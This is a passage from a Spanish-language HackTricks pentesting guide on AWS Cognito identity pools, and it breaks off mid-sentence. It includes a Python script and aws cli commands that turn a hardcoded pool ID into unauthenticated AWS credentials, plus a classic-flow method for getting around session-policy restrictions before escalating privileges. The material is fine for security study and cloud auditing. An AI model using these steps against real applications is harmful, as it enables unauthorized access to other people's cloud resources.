# Pools de identidad de Cognito

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n b谩sica

Con un pool de identidad, tus usuarios pueden **obtener credenciales temporales de AWS para acceder a los servicios de AWS**, como Amazon S3 y DynamoDB. Los pools de identidad admiten usuarios invitados an贸nimos, as铆 como los siguientes proveedores de identidad que puedes usar para autenticar a los usuarios para los pools de identidad:

* Pools de usuarios de Amazon Cognito
* Inicio de sesi贸n social con Facebook, Google, Inicio de sesi贸n con Amazon y Inicio de sesi贸n con Apple
* Proveedores de OpenID Connect (OIDC)
* Proveedores de identidad SAML
* Identidades autenticadas por el desarrollador

### Cognito Sync

Para generar sesiones de pool de identidad, primero necesitas **generar un ID de identidad**. Este ID de identidad es la **identificaci贸n de la sesi贸n de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **煤til para mantener informaci贸n de un usuario** (que siempre usar谩 el mismo ID de identidad).

Adem谩s, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta informaci贸n** (en los conjuntos de datos, enviando informaci贸n en flujos y mensajes SNS...).

## Accediendo a roles IAM

### No autenticado

Lo 煤nico que un atacante necesita saber para **obtener credenciales de AWS** en una aplicaci贸n Cognito como usuario no autenticado es el **ID del pool de identidad**, y este **ID debe estar codificado en el c贸digo fuente** de la aplicaci贸n web/m贸vil para que lo use. Un ID se ve as铆: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede obtener por fuerza bruta).

{% hint style="success" %}
El **rol IAM Cognito no autenticado creado a trav茅s de** se llama por defecto `Cognito_<nombre del pool de identidad>Unauth_Role`
{% endhint %}

Si encuentras un ID de pool de identidad codificado en el c贸digo fuente y permite usuarios no autenticados, puedes obtener credenciales de AWS con:

```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
    print(f"Not valid id: {id_pool_id}")
    exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```

O puedes usar los siguientes **comandos de aws cli**:

```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```

{% hint style="warning" %}
Ten en cuenta que por defecto un usuario de cognito **no autenticado NO puede tener ning煤n permiso, incluso si se le asign贸 mediante una pol铆tica**. Revisa la siguiente secci贸n.
{% endhint %}

### Flujo de autenticaci贸n mejorado vs b谩sico

La secci贸n anterior sigui贸 el **flujo de autenticaci贸n mejorado predeterminado**. Este flujo establece una **pol铆tica de sesi贸n restrictiva** [**session policy**](../../aws-basic-information/#session-policies) para la sesi贸n de rol IAM generada. Esta pol铆tica solo permitir谩 que la sesi贸n [**use los servicios de esta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (incluso si el rol ten铆a acceso a otros servicios).

Sin embargo, hay una forma de evitar esto, si el **pool de identidad tiene habilitado el "Flujo b谩sico (cl谩sico)"**, el usuario podr谩 obtener una sesi贸n usando ese flujo que **no tendr谩 esa pol铆tica de sesi贸n restrictiva**.

{% code overflow="wrap" %}
```bash
# Obtener ID de autenticaci贸n
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Obtener token de inicio de sesi贸n
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Usar el token de inicio de sesi贸n para obtener credenciales de sesi贸n IAM
## Si no conoces el role_arn, usa el flujo mejorado anterior para obtenerlo
aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo b谩sico no est谩 habilitado (predeterminado)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [a qu茅 tienes acceso](../../#whoami) y tratar de [escalar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que es probable que a los **usuarios autenticados** se les otorguen **permisos diferentes**, as铆 que si puedes **registrarte dentro de la aplicaci贸n**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

Tambi茅n podr铆a haber **roles** disponibles para **usuarios autenticados que acceden al pool de identidad**.

Para esto, es posible que necesites tener acceso al **proveedor de identidad**. Si ese es un **